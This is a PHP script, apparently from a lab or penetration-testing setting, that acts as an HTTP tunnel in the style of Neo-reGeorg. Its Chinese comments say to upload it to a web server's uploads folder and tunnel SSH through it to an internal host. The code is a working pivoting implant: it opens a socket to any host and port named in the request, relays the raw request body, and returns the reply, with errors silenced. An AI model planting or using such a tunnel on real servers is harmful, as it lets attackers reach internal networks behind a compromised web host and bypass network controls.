<?php
// reference_tunnel.php — HTTP 双向隧道（类 Neo-reGeorg 思路）
// 用途: 本机 ssh 通过此脚本经 web 容器转发到 172.20.0.1:22（或任意内网 host:port）
// 上传到 /uploads/tunnel.php，然后本机:
//   ssh -o "ProxyCommand=curl -s -X POST --data-binary @- 'http://10.0.179.146/uploads/tunnel.php?host=172.20.0.1&port=22'" admin@172.20.0.1
// 说明: 每次请求转发一块数据并返回响应；配合 ssh 的 ProxyCommand 可工作（较慢但可用）
error_reporting(0);
set_time_limit(30);
$host = isset($_GET['host']) ? $_GET['host'] : '172.20.0.1';
$port = isset($_GET['port']) ? intval($_GET['port']) : 22;
$s = @fsockopen($host, $port, $e, $es, 10);
if (!$s) { header('HTTP/1.1 502 Bad Gateway'); echo "connfail"; exit; }
stream_set_timeout($s, 10);
// 若带 initial data 则先发
if (isset($GLOBALS['HTTP_RAW_POST_DATA']) && strlen($GLOBALS['HTTP_RAW_POST_DATA']) > 0) {
    fwrite($s, $GLOBALS['HTTP_RAW_POST_DATA']);
} else {
    $in = file_get_contents('php://input');
    if (strlen($in) > 0) fwrite($s, $in);
}
// 读响应（SSH banner 场景：等服务端先发）
$out = '';
$start = microtime(true);
while (true) {
    $r = fread($s, 4096);
    if ($r === false || $r === '') break;
    $out .= $r;
    if (microtime(true) - $start > 8) break;
    $meta = stream_get_meta_data($s);
    if ($meta['timed_out']) break;
}
fclose($s);
header('Content-Type: application/octet-stream');
echo $out;
?>

